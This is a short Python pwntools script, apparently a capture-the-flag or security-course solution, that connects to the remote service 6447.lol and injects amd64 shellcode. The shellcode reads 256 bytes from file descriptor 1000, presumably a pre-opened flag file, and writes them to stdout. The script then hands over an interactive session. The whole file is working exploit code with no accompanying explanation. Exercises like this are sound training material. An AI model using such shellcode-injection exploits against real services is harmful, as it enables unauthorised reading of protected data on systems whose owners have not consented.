#!/usr/bin/env python3

from pwn import *

HOST = "6447.lol"
PORT = 26246

context.arch = "amd64"

def exploit():
    shellcode = asm(
        "mov rdi, 1000\n"            # rdi = 1000 (fd)
        "lea rsi, [rsp]\n"           # rsi = buffer
        "mov rdx, 0x100\n"           # rdx = 256 bytes to read
        "mov rax, 0\n"               # rax = 0 (syscall number for read)
        "syscall\n"                  # invoke read(1000, buffer, 256)

        "mov rdi, 1\n"               # rdi = 1 (stdout)
        "mov rdx, rax\n"             # rdx = number of bytes read
        "mov rax, 1\n"               # rax = 1 (syscall number for write)
        "syscall\n"                  # invoke write(1, buffer, bytes_read)
    )
    return shellcode  

if __name__ == '__main__':
    p = remote(HOST, PORT)
    shellcode = exploit()
    p.sendline(shellcode)
    p.interactive()
